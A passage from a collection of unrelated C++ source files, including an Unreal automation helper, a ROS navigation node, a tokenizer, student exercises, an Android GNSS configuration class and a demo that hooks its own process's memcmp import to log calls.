Seconds)\n\t{\n\t\treturn FStepResult(FStepResult::EState::DONE, FTimespan::FromSeconds(Seconds));\n\t}\n\n\tstatic FStepResult Done(const FTimespan& Value)\n\t{\n\t\treturn FStepResult(FStepResult::EState::DONE, Value);\n\t}\n\n\tstatic FStepResult Wait(double Seconds)\n\t{\n\t\treturn FStepResult(FStepResult::EState::REPEAT, FTimespan::FromSeconds(Seconds));\n\t}\n\n\tstatic FStepResult Wait(const FTimespan& Value)\n\t{\n\t\treturn FStepResult(FStepResult::EState::REPEAT, Value);\n\t}\n\n\tstatic FStepResult Failed()\n\t{\n\t\treturn FStepResult(FStepResult::EState::FAILED, FTimespan::MinValue());\n\t}\n};\n\nclass FActionSequenceExtensions\n{\npublic:\n\n\tstatic bool InterpreteCharacter(TCHAR Character, int32* OutKeyCode, int32* OutCharCode)\n\t{\n\t\tbool bSuccess = false;\n\t\tFKey Key = FInputKeyManager::Get().GetKeyFromCodes(0, Character);\n\n\t\tif (!Key.IsValid())\n\t\t{\n\t\t\tif (Character == TEXT('\\n'))\n\t\t\t{\n\t\t\t\t// Treat line feed characters as a simulated Enter key press\n\t\t\t\tKey = EKeys::Enter;\n\t\t\t}\n\t\t\telse if (Character == TEXT('\\t'))\n\t\t\t{\n\t\t\t\tKey = EKeys::Tab;\n\t\t\t}\n\t\t}\n\n\t\tif (Key.IsValid())\n\t\t{\n\t\t\tconst uint32* KeyCodePtr;\n\t\t\tconst uint32* CharCodePtr;\n\t\t\tFInputKeyManager::Get().GetCodesFromKey(Key, KeyCodePtr, CharCodePtr);\n\n\t\t\t*OutKeyCode = (KeyCodePtr == nullptr) ? 0 : *KeyCodePtr;\n\t\t\t*OutCharCode = (CharCodePtr == nullptr) ? Character : *CharCodePtr;\n\t\t\tbSuccess = true;\n\t\t}\n\t\telse if (Character != TEXT('\\r')) // skip processing any carriage returns\n\t\t{\n\t\t\t*OutKeyCode = 0;\n\t\t\t*OutCharCode = Character;\n\t\t\tbSuccess = true;\n\t\t}\n\n\t\treturn bSuccess;\n\t}\n\n\tstatic FStepResult LocateElement(const TSharedRef<FAsyncAutomationDriver, ESPMode::ThreadSafe>& AsyncDriver, const TSharedPtr<IElementLocator, ESPMode::ThreadSafe>& ElementLocator, const FTimespan& TotalProcessTime, TSharedPtr<IApplicationElement>& OutElement)\n\t{\n\t\tTArray<TSharedRef<IApplicationElement>> Elements;\n\t\tElementLocator->Locate(Elements);\n\n\t\tif (Elements.Num() > 1)\n\t\t{\n\t\t\tFAutomationDriverLogging::TooManyElementsFound(Elements);\n\t\t\treturn FStep::Failed();\n\t\t}\n\n\t\tif (Elements.Num() == 0)\n\t\t{\n\t\t\tif (TotalProcessTime >= AsyncDriver->GetConfiguration()->ImplicitWait)\n\t\t\t{\n\t\t\t\tFAutomationDriverLogging::CannotFindElement(ElementLocator);\n\t\t\t\treturn FStep::Failed();\n\t\t\t}\n\n\t\t\treturn FStep::Wait(1);\n\t\t}\n\n\t\tOutElement = Elements[0];\n\t\treturn FStep::Done();\n\t}\n\n\tstatic FStepResult LocateVisibleElement(const TSharedRef<FAsyncAutomationDriver, ESPMode::ThreadSafe>& AsyncDriver, const TSharedPtr<IElementLocator, ESPMode::ThreadSafe>& ElementLocator, const FTimespan& TotalProcessTime, TSharedPtr<IApplicationElement>& OutElement)\n\t{\n\t\tTSharedPtr<IApplicationElement> Element;\n\t\tFStepResult Result = LocateElement(AsyncDriver, ElementLocator, TotalProcessTime, Element);\n\n\t\tif (Result.State != FStepResult::EState::DONE)\n\t\t{\n\t\t\treturn Result;\n\t\t}\n\n\t\tif (!Element->IsVisible())\n\t\t{\n\t\t\tif (TotalProcessTime >= AsyncDriver->GetConfiguration()->ImplicitWait)\n\t\t\t{\n\t\t\t\tFAutomationDriverLogging::ElementNotVisible(ElementLocator);\n\t\t\t\treturn FStep::Failed();\n\t\t\t}\n\n\t\t\treturn FStep::Wait(1);\n\t\t}\n\n\t\tOutElement = Element;\n\t\treturn FStep::Done();\n\t}\n\n\tstatic FStepResult LocateVisibleInteractableElement(const TSharedRef<FAsyncAutomationDriver, ESPMode::ThreadSafe>& AsyncDriver, const TSharedPtr<IElementLocator, ESPMode::ThreadSafe>& ElementLocator, const FTimespan& TotalProcessTime, TSharedPtr<IApplicationElement>& OutElement)\n\t{\n\t\tTSharedPtr<IApplicationElement> Element;\n\t\tFStepResult Result = LocateVisibleElement(AsyncDriver, ElementLocator, TotalProcessTime, Element);\n\n\t\tif (Result.State != FStepResult::EState::DONE)\n\t\t{\n\t\t\treturn Result;\n\t\t}\n\n\t\tif (!Element->IsInteractable())\n\t\t{\n\t\t\tif (TotalProcessTime >= AsyncDriver->GetConfiguration()->ImplicitWait)\n\t\t\t{\n\t\t\t\tFAutomationDriverLogging::ElementNotInteractable(ElementLocator);\n\t\t\t\treturn FStep::Failed();\n\t\t\t}\n\n\t\t\treturn FStep::Wait(1);\n\t\t}\n\n\t\tOutElement = Element;\n\t\treturn FStep::Done();\n\t}\n};\n\nclass FAsyncActionSequence\n\t: public IAsyncActionSequence\n\t, public TSharedFromThis<FAsyncActionSequence, ESPMode::ThreadSafe>\n{\npublic:\n\n\tenum class EElementAnchor : uint8\n\t{\n\t\tTOP_LEFT_CORNER,\n\t\tCENTER,\n\t};\n\n\tvirtual ~FAsyncActionSequence()\n\t{ }\n\n\tvirtual IAsyncActionSequence& Wait(FTimespan Timesp",
    "#include <ros/ros.h>\n#include <geometry_msgs/Twist.h>\n#include <nav_msgs/Odometry.h>\n#include <tf/transform_datatypes.h>\n#include <actionlib/server/simple_action_server.h>\n#include <AMPER/MoveAction.h>\n#include <cmath>\n#include <iostream>\n\nclass Vector3 {\nprivate:\n    double x;\n    double y;\n    double angle;\npublic:\n    Vector3(double x, double y, double angle):\n            x(x), y(y), angle(angle)\n    {\n\n    }\n\n    double getX() {\n        return x;\n    }\n\n    double getY() {\n        return y;\n    }\n\n    double getAngle() {\n        return angle;\n    }\n\n    Vector3 subtractPos(Vector3 v2) {\n        Vector3 newVec{x - v2.getX(), y - v2.getY(), 0.0};\n        return newVec;\n    }\n\n    Vector3 addDistance(double distance) {\n\n        double newX = x + distance * cos(angle);\n        double newY = y + distance * sin(angle);\n\n        return Vector3(newX, newY, angle);\n    }\n\n    Vector3 addAngle(double angle) {\n        double newAngle = getAngle() + angle;\n        return Vector3(x, y, newAngle);\n    }\n\n    double lengthPos() {\n        return std::sqrt(x*x + y*y);\n    }\n};\n\nclass Navigator {\npublic:\n    enum robotState {\n        TURNING,\n        MOVING_FORWARD,\n        IDLE\n    };\n\n    Navigator(): moveServer(nh, \"MoveServer\", false)\n    {\n        moveServer.registerGoalCallback(boost::bind(&Navigator::moveGoalCB, this));\n        moveServer.registerPreemptCallback(boost::bind(&Navigator::preemptGoalCB, this));\n        moveServer.start();\n        cmdVelPub = nh.advertise<geometry_msgs::Twist>(\"/AMPER/navigation/cmd_vel\", 10);\n        pidControlTimer = nh.createTimer(ros::Duration(1.0 / 100.0), &Navigator::pidControlCallback, this);\n        odomSub = nh.subscribe(\"/AMPER/navigation/odom\", 10, &Navigator::odomCallback, this);\n        currentState = IDLE;\n    }\n\n\n    void moveGoalCB() {\n        ros::Rate loop_rate(100);\n        ROS_INFO(\"Goal Received!\");\n        AMPER::MoveGoal goal = *moveServer.acceptNewGoal();\n\n        // Waits till current position is known\n        // It's a little hack\n        while (currentPos.getX() == -100000000.0) {\n            loop_rate.sleep();\n            ros::spinOnce();\n        }\n        ROS_INFO(\"Position received! Calculating goal position!\");\n\n        // Calculates new goal position\n        if (goal.is_turn_action) {\n            // translate angle to standard definition angle\n            double angle = PI * goal.angle / 180.0;\n\n            goalPos = currentPos.addAngle(angle);\n\n            currentState = TURNING;\n        } else {\n            goalPos = currentPos.addDistance(goal.distance);\n            currentState = MOVING_FORWARD;\n        }\n    }\n\n    void preemptGoalCB() {\n        reset();\n        ROS_INFO(\"Cancel request for goal received, preempting goal!\");\n        moveServer.setPreempted();\n    }\n\n    void reset() {\n        geometry_msgs::Twist emptyCmdMsg;\n        currentState = IDLE;\n        errorIntegral = 0.0;\n        prevError = 0.0;\n        cmdVelPub.publish(emptyCmdMsg);\n    }\n\n    void succeedGoal() {\n        result.success = true;\n        moveServer.setSucceeded(result);\n    }\n\n    double getDist(Vector3 v1, Vector3 v2) {\n        Vector3 subVec = v1.subtractPos(v2);\n\n        return subVec.lengthPos();\n    }\n\n    double getAngleDist(double a1, double a2) {\n        double diff = a1 - a2;\n        diff = 180.0 * diff / PI;   // rad2deg\n        diff = std::fmod((diff + 180.0), 360.0) - 180.0;\n        return PI * diff / 180.0; // deg2rad\n    }\n\n    void turn(double dt) {\n        ROS_INFO(\"currentAngle %f goalAngle %f\", currentPos.getAngle(), goalPos.getAngle());\n        geometry_msgs::Twist cmdMsg;\n        double desiredAngle = goalPos.getAngle();\n        double angleDistance = getAngleDist(desiredAngle, currentPos.getAngle());\n\n        int sign = angleDistance > 0 ? 1 : -1;\n\n        double absAngleDistance = std::abs(angleDistance);\n        double angularVelocity = sign * std::min(maxAngularVel, absAngleDistance);\n\n        ROS_INFO(\"TURNING with angular velocity %f\", angularVelocity);\n        ROS_INFO(\"remaining angleDistance %f\", angleDistance);\n\n        cmdMsg.angular.z = angularVelocity;\n\n        feedback.angle_remaining = angleDistance;\n        feedback.distance_remaining = 0;\n        moveServer.publishFeedback(feedback);\n\n        cmdVelPub.publish(cmdMsg);\n    }\n\n    void move(double dt) {\n        ROS_INFO(\"currentPos %f %f goalPos %f %f\", currentPos.getX(), currentPos.getY(), goalPos.getX(), goalPos.getY());\n        geometry_msgs::Twist cmdMsg;\n        double distanceRemaining = getDist(goalPos, currentPos);\n        ROS_INFO(\"dist %f\", distanceRemaining);\n        double pTerm = kp * distanceRemaining;\n\n        errorIntegral += dt * distanceRemaining;\n        double iTerm = ki * errorIntegral;\n        double dTerm = kd * (distanceRemaining - prevError) / dt;\n\n        prevError = distanceRemaining;\n\n        ROS_INFO(\"pid %f\", pTerm + iTerm + dTerm);\n\n        double velocity = std::min(maxVel, pTerm + iTerm + dTerm);\n        ROS_INFO(\"velocity %f\", velocity);\n\n        cmdM",
    "\ufeff/**\r\n * Autor: Filip \u010coni\u0107\r\n * Datum: 27. 05. 2024.\r\n */\r\n\r\n#include <iostream>\r\n#include <iomanip>\r\n\r\n#include \"Token.h\"\r\n#include \"FiniteStateMachine.h\"\r\n\r\nusing namespace std;\r\n\r\n\r\nTokenType Token::getType()\r\n{\r\n\treturn tokenType;\r\n}\r\n\r\n\r\nvoid Token::setType(TokenType t)\r\n{\r\n\ttokenType = t;\r\n}\r\n\r\n\r\nstring Token::getValue()\r\n{\r\n\treturn value;\r\n}\r\n\r\n\r\nvoid Token::setValue(string s)\r\n{\r\n\tvalue = s;\r\n}\r\n\r\n\r\nvoid Token::makeToken(int begin, int end, std::vector<char>& programBuffer,  int lastFiniteState)\r\n{\r\n\tstring _value = \"\";\r\n\tfor (int i = begin; i < end; i++)\r\n\t{\r\n\t\t_value += programBuffer[i];\r\n\t}\r\n\tvalue = _value;\r\n\ttokenType = FiniteStateMachine::getTokenType(lastFiniteState);\r\n}\r\n\r\n\r\nvoid Token::makeErrorToken(int pos, std::vector<char>& programBuffer)\r\n{\r\n\ttokenType = T_ERROR;\r\n\tvalue = programBuffer[pos];\r\n}\r\n\r\n\r\nvoid Token::makeEofToken()\r\n{\r\n\ttokenType = T_END_OF_FILE;\r\n\tvalue = \"EOF\";\r\n}\r\n\r\n\r\nvoid Token::printTokenInfo()\r\n{\r\n\tcout << setw(LEFT_ALIGN) << left << tokenTypeToString(tokenType);\r\n\tcout << setw(RIGHT_ALIGN) << right << value << endl;\r\n}\r\n\r\n\r\nvoid Token::printTokenValue()\r\n{\r\n\tcout << value << endl;\r\n}\r\n\r\n\r\nstring Token::tokenTypeToString(TokenType t)\r\n{\r\n\tswitch (t)\r\n\t{\r\n\t\tcase T_NO_TYPE:\t\t\treturn \"[T_NO_TYPE]\";\r\n\t\tcase T_ID:\t\t\t\treturn \"[T_ID]\";\r\n\t\tcase T_M_ID:\t\t\treturn \"[T_M_ID]\";\r\n\t\tcase T_R_ID:\t\t\treturn \"[T_R_ID]\";\r\n\t\tcase T_NUM:\t\t\t\treturn \"[T_NUM]\";\r\n\t\tcase T_WHITE_SPACE:\t\treturn \"[T_WHITE_SPACE]\";\r\n\t\tcase T_MEM:\t\t\t\treturn \"[T_MEM]\";\r\n\t\tcase T_REG:\t\t\t\treturn \"[T_REG]\";\r\n\t\tcase T_FUNC:\t\t\treturn \"[T_FUNC]\";\r\n\t\tcase T_ADD:\t\t\t\treturn \"[T_ADD]\";\r\n\t\tcase T_ADDI:\t\t\treturn \"[T_ADDI]\";\r\n\t\tcase T_SUB:\t\t\t\treturn \"[T_SUB]\";\r\n\t\tcase T_LA:\t\t\t\treturn \"[T_LA]\";\r\n\t\tcase T_LI:\t\t\t\treturn \"[T_LI]\";\r\n\t\tcase T_LW:\t\t\t\treturn \"[T_LW]\";\r\n\t\tcase T_SW:\t\t\t\treturn \"[T_SW]\";\r\n\t\tcase T_BLTZ:\t\t\treturn \"[T_BLTZ]\";\r\n\t\tcase T_B:\t\t\t\treturn \"[T_B]\";\r\n\t\tcase T_NOP:\t\t\t\treturn \"[T_NOP]\";\r\n\t\tcase T_COMMA:\t\t\treturn \"[T_COMMA]\";\r\n\t\tcase T_L_PARENT:\t\treturn \"[T_L_PARENT]\";\r\n\t\tcase T_R_PARENT:\t\treturn \"[T_R_PARENT]\";\r\n\t\tcase T_COL:\t\t\t\treturn \"[T_COL]\";\r\n\t\tcase T_SEMI_COL:\t\treturn \"[T_SEMI_COL]\";\r\n\t\tcase T_COMMENT:\t\t\treturn \"[T_COMMENT]\";\r\n\t\tcase T_END_OF_FILE:\t\treturn \"[T_END_OF_FILE]\";\r\n\t\tcase T_ERROR:\t\t\treturn \"[T_ERROR]\";\r\n\t\tcase T_AND:             return \"[T_AND]\";\r\n\t\tcase T_OR:              return \"[T_OR]\";\r\n\t\tcase T_NOT:             return \"[T_NOT]\";\r\n\t\tcase T_BNE:             return \"[T_BNE]\";\r\n\t\tdefault:\t\t\t\treturn \"\";\r\n\t}\r\n}\r\n\r\nstring tokenTypeToString(TokenType t)\r\n{\r\n\tswitch (t)\r\n\t{\r\n\tcase T_NO_TYPE:\t\t\treturn \"[T_NO_TYPE]\";\r\n\tcase T_ID:\t\t\t\treturn \"[T_ID]\";\r\n\tcase T_M_ID:\t\t\treturn \"[T_M_ID]\";\r\n\tcase T_R_ID:\t\t\treturn \"[T_R_ID]\";\r\n\tcase T_NUM:\t\t\t\treturn \"[T_NUM]\";\r\n\tcase T_WHITE_SPACE:\t\treturn \"[T_WHITE_SPACE]\";\r\n\tcase T_MEM:\t\t\t\treturn \"[T_MEM]\";\r\n\tcase T_REG:\t\t\t\treturn \"[T_REG]\";\r\n\tcase T_FUNC:\t\t\treturn \"[T_FUNC]\";\r\n\tcase T_ADD:\t\t\t\treturn \"[T_ADD]\";\r\n\tcase T_ADDI:\t\t\treturn \"[T_ADDI]\";\r\n\tcase T_SUB:\t\t\t\treturn \"[T_SUB]\";\r\n\tcase T_LA:\t\t\t\treturn \"[T_LA]\";\r\n\tcase T_LI:\t\t\t\treturn \"[T_LI]\";\r\n\tcase T_LW:\t\t\t\treturn \"[T_LW]\";\r\n\tcase T_SW:\t\t\t\treturn \"[T_SW]\";\r\n\tcase T_BLTZ:\t\t\treturn \"[T_BLTZ]\";\r\n\tcase T_B:\t\t\t\treturn \"[T_B]\";\r\n\tcase T_NOP:\t\t\t\treturn \"[T_NOP]\";\r\n\tcase T_COMMA:\t\t\treturn \"[T_COMMA]\";\r\n\tcase T_L_PARENT:\t\treturn \"[T_L_PARENT]\";\r\n\tcase T_R_PARENT:\t\treturn \"[T_R_PARENT]\";\r\n\tcase T_COL:\t\t\t\treturn \"[T_COL]\";\r\n\tcase T_SEMI_COL:\t\treturn \"[T_SEMI_COL]\";\r\n\tcase T_COMMENT:\t\t\treturn \"[T_COMMENT]\";\r\n\tcase T_END_OF_FILE:\t\treturn \"[T_END_OF_FILE]\";\r\n\tcase T_ERROR:\t\t\treturn \"[T_ERROR]\";\r\n\tcase T_AND:             return \"[T_AND]\";\r\n\tcase T_OR:              return \"[T_OR]\";\r\n\tcase T_NOT:             return \"[T_NOT]\";\r\n\tdefault:\t\t\t\treturn \"\";\r\n\t}\r\n}\r\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   megaphone.cpp                                      :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: tiaferna <tiaferna@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/06/02 16:43:48 by tiaferna          #+#    #+#             */\n/*   Updated: 2024/06/02 21:33:04 by tiaferna         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include <iostream>\n\nclass Megaphone\n{\npublic:\n\tvoid\tScream(const std::string &str)\n\t{\n\t\tfor (size_t i = 0; i < str.size(); i++)\n\t\t\tstd::cout << (char)toupper((unsigned char)str[i]);\n\t}\n};\n\nint\tmain(int argc, char **argv)\n{\n\tif (argc == 1)\n\t\tstd::cout << \"* LOUD AND UNBEARABLE FEEDBACK NOISE *\" << std::endl;\n\telse\n\t{\n\t\tMegaphone speaker;\n\t\tfor (int i = 1; i < argc; i++)\n\t\t\tspeaker.Scream(argv[i]);\n\t\tstd::cout << std::endl;\n\t}\n}\n",
    "\ufeff#include <Windows.h>\r\n#include <cstdio>\r\n\r\ntypedef int(__cdecl* PMemcmp)(const void* buf1, const void* buf2, size_t count);\r\n\r\nDWORD GetMemcmpAddressFromIAT() {\r\n    HMODULE hModule = GetModuleHandle(NULL);\r\n    if (!hModule) {\r\n        printf(\"Failed to get handle of current module\\n\");\r\n        return 0;\r\n    }\r\n\r\n    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;\r\n    PIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)hModule + pDosHeader->e_lfanew);\r\n    PIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32) & (pNTHeader->OptionalHeader);\r\n    PIMAGE_IMPORT_DESCRIPTOR pIMPORT_DESCRIPTOR = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hModule + pOptionHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);\r\n\r\n    while (pIMPORT_DESCRIPTOR->FirstThunk) {\r\n        PDWORD FirstThunk = (PDWORD)((DWORD)hModule + pIMPORT_DESCRIPTOR->FirstThunk);\r\n        PDWORD OriginalFirstThunk = (PDWORD)((DWORD)hModule + pIMPORT_DESCRIPTOR->OriginalFirstThunk);\r\n        while (*FirstThunk) {\r\n            char* functionName = (char*)((*OriginalFirstThunk) + (DWORD)hModule + 2);\r\n            if (strcmp(functionName, \"memcmp\") == 0) {\r\n                return (DWORD)FirstThunk;\r\n            }\r\n            FirstThunk++;\r\n            OriginalFirstThunk++;\r\n        }\r\n        pIMPORT_DESCRIPTOR++;\r\n    }\r\n\r\n    printf(\"Failed to find memcmp in IAT.\\n\");\r\n    return 0;\r\n}\r\n\r\nint __cdecl MyMemcmp(const void* buf1, const void* buf2, size_t count) {\r\n    printf(\"Hooked memcmp Param: buf1: %p, buf2: %p, count: %zu\\n\", buf1, buf2, count);\r\n\r\n    PMemcmp OriginalMemcmp = (PMemcmp)GetProcAddress(GetModuleHandleA(\"ucrtbase.dll\"), \"memcmp\");\r\n    if (!OriginalMemcmp) {\r\n        printf(\"Failed to call original memcmp.\\n\");\r\n        return -1;\r\n    }\r\n    int result = OriginalMemcmp(buf1, buf2, count);\r\n\r\n    printf(\"Original memcmp result: %d\\n\", result);\r\n    return result;\r\n}\r\n\r\nvoid InstallIatHook(DWORD* pdwOldFunction, DWORD dwNewFunction) {\r\n    DWORD dwOldProtect;\r\n    if (VirtualProtect(pdwOldFunction, sizeof(DWORD), PAGE_READWRITE, &dwOldProtect)) {\r\n        *pdwOldFunction = dwNewFunction;\r\n        VirtualProtect(pdwOldFunction, sizeof(DWORD), dwOldProtect, &dwOldProtect);\r\n        printf(\"Function hooked successfully.\\n\");\r\n    }\r\n    else {\r\n        printf(\"Failed to change protection of IAT.\\n\");\r\n    }\r\n}\r\n\r\nint main(int argc, char* argv[]) {\r\n    DWORD* dwMemcmp = (DWORD*)GetMemcmpAddressFromIAT();\r\n    if (dwMemcmp == 0) {\r\n        printf(\"Failed to get memcmp address from IAT.\\n\");\r\n        return -1;\r\n    }\r\n\r\n    printf(\"memcmp address in IAT: %p\\n\", (void*)*dwMemcmp);\r\n\r\n    InstallIatHook(dwMemcmp, (DWORD)MyMemcmp);\r\n\r\n    char buf1[] = \"test1\";\r\n    char buf2[] = \"test2\";\r\n    memcmp(buf1, buf2, sizeof(buf1));\r\n\r\n    // Uncomment below to uninstall the hook\r\n    // UninstallIatHook(dwMemcmp, (DWORD)MyMemcmp);\r\n    // memcmp(buf1, buf2, sizeof(buf1));\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"search.h\"\r\nusing namespace std;\r\nconst char separators[] = \" .,-:!\\\"\\'()?\u2014[]\u201c\u201d\u2018\u2019\u02d9;@\";\r\nbool find(const char* text,int idx,int sz) {\r\n    if(idx<0){return false;}\r\n    else if(idx>=sz){return false;}\r\n    else{for (int k = 0; separators[k] != '\\0'; k++) {\r\n        if (separators[k] == text[idx]) {\r\n            return true;\r\n        }\r\n    }\r\n    }\r\n    return false;\r\n}\r\nNode* KMPSearch(const char* text,vector<int>w2, const char* pattern, int m, int n,Node* start,int &n_matches)\r\n{   \r\n    if (*pattern == '\\0' || n == 0) {\r\n        return start;\r\n    }\r\n    if (*text == '\\0' || n > m) {\r\n        return start;\r\n    }\r\n    int next[n + 1];\r\n    for (int i = 0; i < n + 1; i++) {\r\n        next[i] = 0;\r\n    }\r\n    for (int i = 1; i < n; i++)\r\n    {\r\n        int j = next[i];\r\n        while (j > 0 && tolower(pattern[j]) != tolower(pattern[i])) {\r\n            j = next[j];\r\n        }\r\n        if (j > 0 || tolower(pattern[j]) == tolower(pattern[i])) {\r\n            next[i + 1] = j + 1;\r\n        }\r\n    }\r\n    for (int i = 0, j = 0; i < m; i++)\r\n    {\r\n        if ( tolower(*(text + i)) == tolower(*(pattern + j)))\r\n        {\r\n            if (++j == n) \r\n            { \r\n             if((i-j+1==0||find(text,i-j,m))&&(i-j+n==m-1||find(text,i-j+n+1,m)))\r\n             {Node* nainode=new Node(w2[0],w2[1],w2[2],w2[3],i-j+1);\r\n             start->right=nainode;\r\n             start=nainode;\r\n             ++n_matches;}\r\n            }\r\n        }\r\n        else if (j > 0)\r\n        {\r\n            j = next[j];\r\n            i--;   \r\n        }\r\n    }\r\n    return start;\r\n}\r\nSearchEngine::SearchEngine(){\r\n    vector<pair<vector<int>,string>> Corpus;\r\n}\r\n\r\nSearchEngine::~SearchEngine(){\r\n   \r\n}\r\n\r\nvoid SearchEngine::insert_sentence(int book_code, int page, int paragraph, int sentence_no, string sentence){\r\n  Corpus.push_back({{book_code,page,paragraph,sentence_no},sentence});\r\n}\r\n\r\nNode* SearchEngine::search(string pattern, int& n_matches) {\r\n    Node* root=new Node();\r\n    Node* p1=new Node();\r\n    p1=root;\r\n    n_matches=0;\r\n    for(auto it=Corpus.begin();it!=Corpus.end();++it){\r\n        int m=pattern.size(); \r\n        int n=it->second.size();\r\n         const char* p=pattern.c_str();\r\n         const char* w1=it->second.c_str();\r\n         vector<int> w2=it->first;\r\n        p1=KMPSearch(w1,w2,p,n,m,p1,n_matches);\r\n    }\r\n    return root->right;\r\n    }\r\n",
    "#include <iostream>\n#include <locale>\n\nvoid fillArray(int* arr, int size) {\n    std::wprintf(L\"Enter %d integers:\\n\", size);\n    for (int i = 0; i < size; ++i) {\n        if (wscanf_s(L\"%d%*c\", arr + i) != 1) {\n            fwprintf(stderr, L\"Input error. Please enter an integer.\\n\");\n            exit(EXIT_FAILURE);\n        }\n    }\n}\n\nvoid processArray(int* arr, int size) {\n    if (size < 6) {\n        fwprintf(stderr, L\"The size of the array is too small.\\n\");\n        return;\n    }\n\n    int* startPtr = arr + 2;\n    int* endPtr = arr + size - 3;\n\n    int count = static_cast<int>(endPtr - startPtr) + 1;\n\n    int* secondArray = new int[count];\n    for (int i = 0; i < count; ++i) {\n        *(secondArray + i) = *(startPtr + i);\n    }\n\n    int sum = 0;\n    for (int i = 0; i < count; ++i) {\n        sum += *(startPtr + i);\n    }\n    wprintf(L\"The sum of elements between the third from the beginning and third from the end: %d\\n\", sum);\n\n    wprintf(L\"Elements between the third from the beginning and third from the end in the second array:\\n\");\n    for (int i = 0; i < count; ++i) {\n        wprintf(L\"%d \", *(secondArray + i));\n    }\n    wprintf(L\"\\n\");\n\n    delete[] secondArray;\n}\n\nint main() {\n    int N;\n\n    if (!setlocale(LC_ALL, \"en_US.utf8\")) {\n        fwprintf(stderr, L\"Failed to set the locale for English language.\\n\");\n        return EXIT_FAILURE;\n    }\n\n    wprintf(L\"Enter the size of the array: \");\n    if (wscanf_s(L\"%d\", &N) != 1) {\n        fwprintf(stderr, L\"Input error for the array size. Please enter an integer.\\n\");\n        return EXIT_FAILURE;\n    }\n\n    int* array = new int[N];\n\n    fillArray(array, N);\n\n    processArray(array, N);\n\n    delete[] array;\n\n    return 0;\n}",
    "#include <iostream>\n#include <fstream>\n#include <sys/types.h>\n#include <unistd.h>\n#include <sys/wait.h>\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <cstring>\n#include <sstream> // Include for std::istringstream\n\nstruct SharedData {\n    float f1, f2, f3, f4, f5;\n    float qw,qx,qy,qz;\n    float yaw, pitch, roll;\n};\n\nint main() {\n    pid_t pid = fork();\n    if (pid == 0) {\n        // Child process\n        const char *args[] = {\"python3\", \"mpuReader.py\", NULL};  // Use const char* for string literals\n        execvp(\"python3\", const_cast<char**>(args));\n        exit(1);  // execvp only returns on error\n    } else if (pid > 0) {\n        // Parent process\n        const char* fifo_path = \"/tmp/mpu_fifo\";\n        std::ifstream fifo(fifo_path);\n\n        // Set up shared memory\n        int shm_fd = shm_open(\"/SharedMemoryMPU\", O_CREAT | O_RDWR, 0666);\n        ftruncate(shm_fd, sizeof(SharedData));\n        SharedData* shared_data = static_cast<SharedData*>(\n            mmap(nullptr, sizeof(SharedData), PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0)\n        );\n\n        std::string line;\n        while (getline(fifo, line)) {\n            std::istringstream iss(line);\n            if (!(iss >>shared_data->yaw >> \n                  shared_data->pitch >> shared_data->roll >>shared_data->f5 >> shared_data->f4 >> shared_data->f3 >> \n                  shared_data->f2 >> shared_data->f1 >> shared_data->qw>> shared_data->qx>> shared_data->qy>> shared_data->qz )) {\n                // std::cerr << \"Error parsing line: \" << line << std::endl;\n            } else {\n                 std::cout << line << std::endl;\n            }\n        }\n\n        // Cleanup\n        munmap(shared_data, sizeof(SharedData));\n        close(shm_fd);\n        shm_unlink(\"/SharedMemoryMPU\");\n        wait(NULL);  // Wait for child process to finish\n    } else {\n        std::cerr << \"Failed to fork.\" << std::endl;\n    }\n    return 0;\n}\n",
    "/*\n * Copyright (c) 2017-2019, The Linux Foundation. All rights reserved.\n * Not a Contribution\n */\n/*\n * Copyright (C) 2016 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"LocSvc_GnssConfigurationInterface\"\n\n#include <log_util.h>\n#include \"Gnss.h\"\n#include \"GnssConfiguration.h\"\n#include \"ContextBase.h\"\n#include <android/hardware/gnss/1.0/types.h>\n\nnamespace android {\nnamespace hardware {\nnamespace gnss {\nnamespace V2_0 {\nnamespace implementation {\n\nusing ::android::hardware::gnss::V1_0::GnssConstellationType;\nusing namespace loc_core;\n\nGnssConfiguration::GnssConfiguration(Gnss* gnss) : mGnss(gnss) {\n}\n\n// Methods from ::android::hardware::gps::V1_0::IGnssConfiguration follow.\nReturn<bool> GnssConfiguration::setSuplEs(bool enabled)  {\n    // deprecated function. Must return false to pass VTS\n    return false;\n}\n\nReturn<bool> GnssConfiguration::setSuplVersion(uint32_t version)  {\n    if (mGnss == nullptr) {\n        LOC_LOGE(\"%s]: mGnss is nullptr\", __FUNCTION__);\n        return false;\n    }\n\n    GnssConfig config;\n    memset(&config, 0, sizeof(GnssConfig));\n    config.size = sizeof(GnssConfig);\n    config.flags = GNSS_CONFIG_FLAGS_SUPL_VERSION_VALID_BIT;\n    switch (version) {\n        case 0x00020004:\n            config.suplVersion = GNSS_CONFIG_SUPL_VERSION_2_0_4;\n            break;\n        case 0x00020002:\n            config.suplVersion = GNSS_CONFIG_SUPL_VERSION_2_0_2;\n            break;\n        case 0x00020000:\n            config.suplVersion = GNSS_CONFIG_SUPL_VERSION_2_0_0;\n            break;\n        case 0x00010000:\n            config.suplVersion = GNSS_CONFIG_SUPL_VERSION_1_0_0;\n            break;\n        default:\n            LOC_LOGE(\"%s]: invalid version: 0x%x.\", __FUNCTION__, version);\n            return false;\n    }\n\n    return mGnss->updateConfiguration(config);\n}\n\nReturn<bool> GnssConfiguration::setSuplMode(uint8_t mode)  {\n    if (mGnss == nullptr) {\n        